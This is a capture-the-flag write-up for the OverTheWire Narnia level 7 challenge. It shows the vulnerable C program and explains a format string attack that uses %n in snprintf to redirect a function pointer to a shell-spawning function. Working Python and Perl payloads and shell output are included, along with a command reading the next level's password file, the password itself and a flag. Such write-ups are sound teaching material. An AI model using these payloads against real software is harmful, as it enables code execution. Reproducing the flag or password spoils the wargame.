## Challenge Info

**Platform:** OverTheWire - Narnia
**Tags :** #Challenge #BinaryExploitation #FormatString 
**Completion Date & Time :** 2026 - 05 - 29 / 00:06

---
## FLAG : `aToTvI5BYB`

---
## Solution :

### Step 1 : Analyze problems

We have the `narnia7.c` file, so let's try to understand it first :
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

int goodfunction();
int hackedfunction();

int vuln(const char *format){
        char buffer[128];
        int (*ptrf)();

        memset(buffer, 0, sizeof(buffer));
        printf("goodfunction() = %p\n", goodfunction);
        printf("hackedfunction() = %p\n\n", hackedfunction);

        ptrf = goodfunction;
        printf("before : ptrf() = %p (%p)\n", ptrf, &ptrf);

        printf("I guess you want to come to the hackedfunction...\n");
        sleep(2);
        ptrf = goodfunction;

        snprintf(buffer, sizeof buffer, format);

        return ptrf();
}

int main(int argc, char **argv){
        if (argc <= 1){
                fprintf(stderr, "Usage: %s <buffer>\n", argv[0]);
                exit(-1);
        }
        exit(vuln(argv[1]));
}

int goodfunction(){
        printf("Welcome to the goodfunction, but i said the Hackedfunction..\n");
        fflush(stdout);

        return 0;
}

int hackedfunction(){
        printf("Way to go!!!!");
            fflush(stdout);
        setreuid(geteuid(),geteuid());
        system("/bin/sh");

        return 0;
}
```

Based on the information above, we got some point : 
1. The address of `hackedfunction` was leaked
2. The location of `ptrf` pointing and the address of `ptrf` (`&ptrf`) were also leaked.
3. `snprintf(buffer, sizeof buffer, format);` And this is the most important part, `snprintf` is very vulnerable to [[Format String Attack]]
4. We could see that `hackedfunction()` will call `system("/bin/sh")`, this mean our task is only to make `ptrf` pointing to `hackedfunction()`
5. Actually, this problem is very similar to [[Narnia (5 -> 6)]].
### Step 2 : Try a random payload

Since buffer has **128 bytes**, we will use all of that :
```shell
narnia7@narnia:/narnia$ ./narnia7 $(perl -e 'print "A"x128')
goodfunction() = 0x80492ea
hackedfunction() = 0x804930f

before : ptrf() = 0x80492ea (0xffffd2a8)
I guess you want to come to the hackedfunction...
Welcome to the goodfunction, but i said the Hackedfunction..
```

From the output above, we've known that :
1. The address of `hackedfunction()` : `0x804930f`
2. The address of `ptrf()` : `0xffffd2a8`

So, the idea is using **Format String Attack** to modify the address `0xffffd2a8` to contain `0x0804930f` (In decimal : **134517519**)

This attack would work because `snprintf` has the same behavior from `printf`, the only difference is `snprintf` will save the output on a `buffer` (variable) and `printf` will print the output on `stdout` (which is Terminal).

The payload would look like : 
```shell
#For python3
$(python3 -c 'import sys; sys.stdout.buffer.write (b"\xa8\xd2\xff\xff" + b"%134517519x%n")')
```
```shell
#For Perl
$(perl -e 'print "\xa8\xd2\xff\xff" . "%134517519x%n"  ' )
```

### Step 3 : Payload Executing
```shell
narnia7@narnia:/narnia$ ./narnia7 $(python3 -c 'import sys; sys.stdout.buffer.write (b"\xa8\xd2\xff\xff" + b"%134517519x%n")')
goodfunction() = 0x80492ea
hackedfunction() = 0x804930f

before : ptrf() = 0x80492ea (0xffffd318)
I guess you want to come to the hackedfunction...
Welcome to the goodfunction, but i said the Hackedfunction..
```

It seems like the address of `ptrf` has shifted, this happens because the number of bytes we put on `argv`. 
So let's just change it to :
```perl
$(perl -e 'print "\x18\xd3\xff\xff" . "%134517519x%n"  ' )
```

And here is the result :
```shell
narnia7@narnia:/narnia$ ./narnia7 $(perl -e 'print "\x18\xd3\xff\xff" . "%134517519x%n"  ' )
#goodfunction() = 0x80492ea
#hackedfunction() = 0x804930f

#before : ptrf() = 0x80492ea (0xffffd318)
#I guess you want to come to the hackedfunction...
#Way to go!!!!
$ whoami
narnia8
$ cat /etc/narnia_pass/narnia8
i1SQ81fkb8

```

---
### Key Takeaways : 
- Buffer overflow will fail because, `snprintf()` will only copy with the size of `buffer`, so it won't overflow and replace other stack.
---
## Related Concepts : 
[[Format String Attack]], [[snprintf()]], [[Narnia (5 -> 6)]]

---
## Next Challenge :
[[Narnia (8)]]